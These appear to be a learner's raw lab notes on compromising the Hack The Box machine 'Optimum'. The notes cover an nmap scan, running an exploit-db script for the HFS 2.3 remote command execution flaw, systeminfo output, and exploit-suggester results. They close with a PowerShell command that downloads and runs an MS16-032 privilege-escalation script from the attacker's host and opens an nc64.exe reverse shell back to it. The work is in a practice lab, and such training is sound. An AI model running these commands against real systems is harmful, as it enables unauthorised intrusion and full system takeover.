Host is up (0.55s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

https://www.rejetto.com/hfs/


└─$ searchsploit -m 39161.py
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)
      URL: https://www.exploit-db.com/exploits/39161
     Path: /usr/share/exploitdb/exploits/windows/remote/39161.py
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: Python script, ASCII text executable, with very long lines (540)
Copied to: /tmp/39161.py



┌──(ed㉿kali)-[/tmp]
└─$ python2 39161.py 10.10.10.8 80


C:\Users\kostas\Desktop>systeminfo
systeminfo

Host Name:                 OPTIMUM
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00252-70000-00000-AA535
Original Install Date:     18/3/2017, 1:51:36 ��
System Boot Time:          20/9/2025, 2:38:30 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest
Total Physical Memory:     4.095 MB
Available Physical Memory: 3.495 MB
Virtual Memory: Max Size:  5.503 MB
Virtual Memory: Available: 4.941 MB
Virtual Memory: In Use:    562 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              \\OPTIMUM
Hotfix(s):                 31 Hotfix(s) Installed.
                           [01]: KB2959936
                           [02]: KB2896496
                           [03]: KB2919355
                           [04]: KB2920189
                           [05]: KB2928120
                           [06]: KB2931358
                           [07]: KB2931366
                           [08]: KB2933826
                           [09]: KB2938772
                           [10]: KB2949621
                           [11]: KB2954879
                           [12]: KB2958262
                           [13]: KB2958263
                           [14]: KB2961072
                           [15]: KB2965500
                           [16]: KB2966407
                           [17]: KB2967917
                           [18]: KB2971203
                           [19]: KB2971850
                           [20]: KB2973351
                           [21]: KB2973448
                           [22]: KB2975061
                           [23]: KB2976627
                           [24]: KB2977629
                           [25]: KB2981580
                           [26]: KB2987107
                           [27]: KB2989647
                           [28]: KB2998527
                           [29]: KB3000850
                           [30]: KB3003057
                           [31]: KB3014442


└─$ nano info.txt  //put syteminfo into it.

 python3 windows-exploit-suggester.py --database 2025-09-13-mssb.xlsx --systeminfo /tmp/info.txt

 └─$ python3 windows-exploit-suggester.py --database 2025-09-13-mssb.xlsx --systeminfo /tmp/info.txt
/home/ed/oscp/windows-exploit-suggester.py:1034: SyntaxWarning: invalid escape sequence '\d'
  regex="( r| rc|release|rel)[ ]*(\d)"
/home/ed/oscp/windows-exploit-suggester.py:1049: SyntaxWarning: invalid escape sequence '\d'
  regex="(sp|pack|pack:)[ ]*(\d)"
/home/ed/oscp/windows-exploit-suggester.py:1105: SyntaxWarning: invalid escape sequence '\d'
  regex="(\d){5,10}"
/home/ed/oscp/windows-exploit-suggester.py:1118: SyntaxWarning: invalid escape sequence '\d'
  regex="MS[\d]{2,3}-[\d]{2,3}"
[*]
initiating winsploit version 3.4...
[*]
database file detected as xlsx based on extension
[*]
attempting to read from the systeminfo input file
[+]
systeminfo input file read successfully (utf-8)
[*]
querying database file for potential vulnerabilities
[*]
comparing the 31 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
[*]
there are now 246 remaining vulns
[+]
[E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+]
windows version identified as 'Windows 2012 R2 64-bit'
[*]

[E]
MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
[*]
  https://www.exploit-db.com/exploits/40745/ -- Microsoft Windows Kernel - win32k Denial of Service (MS16-135)
[*]
  https://www.exploit-db.com/exploits/41015/ -- Microsoft Windows Kernel - 'win32k.sys' 'NtSetWindowLongPtr' Privilege Escalation (MS16-135) (2)
[*]
  https://github.com/tinysec/public/tree/master/CVE-2016-7255
[*]

[E]
MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
[*]
  https://www.exploit-db.com/exploits/41020/ -- Microsoft Windows 8.1 (x64) - RGNOBJ Integer Overflow (MS16-098)
[*]

[M]
MS16-075: Security Update for Windows SMB Server (3164038) - Important
[*]
  https://github.com/foxglovesec/RottenPotato
[*]
  https://github.com/Kevin-Robertson/Tater
[*]
  https://bugs.chromium.org/p/project-zero/issues/detail?id=222 -- Windows: Local WebDAV NTLM Reflection Elevation of Privilege
[*]
  https://foxglovesecurity.com/2016/01/16/hot-potato/ -- Hot Potato - Windows Privilege Escalation
[*]

[E]
MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
[*]
  https://www.exploit-db.com/exploits/39990/ -- Windows - gdi32.dll Multiple DIB-Related EMF Record Handlers Heap-Based Out-of-Bounds Reads/Memory Disclosure (MS16-074), PoC
[*]
  https://www.exploit-db.com/exploits/39991/ -- Windows Kernel - ATMFD.DLL NamedEscape 0x250C Pool Corruption (MS16-074), PoC
[*]

[E]
MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
[*]
  https://www.exploit-db.com/exploits/39994/ -- Internet Explorer 11 - Garbage Collector Attribute Type Confusion (MS16-063), PoC
[*]

[E]
MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
[*]
  https://www.exploit-db.com/exploits/40107/ -- MS16-032 Secondary Logon Handle Privilege Escalation, MSF
[*]
  https://www.exploit-db.com/exploits/39574/ -- Microsoft Windows 8.1/10 - Secondary Logon Standard Handles Missing Sanitization Privilege Escalation (MS16-032), PoC
[*]
  https://www.exploit-db.com/exploits/39719/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (PowerShell), PoC
[*]
  https://www.exploit-db.com/exploits/39809/ -- Microsoft Windows 7-10 & Server 2008-2012 (x32/x64) - Local Privilege Escalation (MS16-032) (C#)
[*]
      
//use ms16-032


3.ps1 -Command 'C:\nc64.exe 10.10.16.21 445 -e cmd.exe'

powershell.exe iex (New-Object Net.WebClient).DownloadString('http://10.10.16.21:80/39719.ps1'); 39719 -Command 'C:\nc64.exe -e cmd.exe 10.10.16.21 445'

//powershell on this machine has problem, finally use msf to exploit....
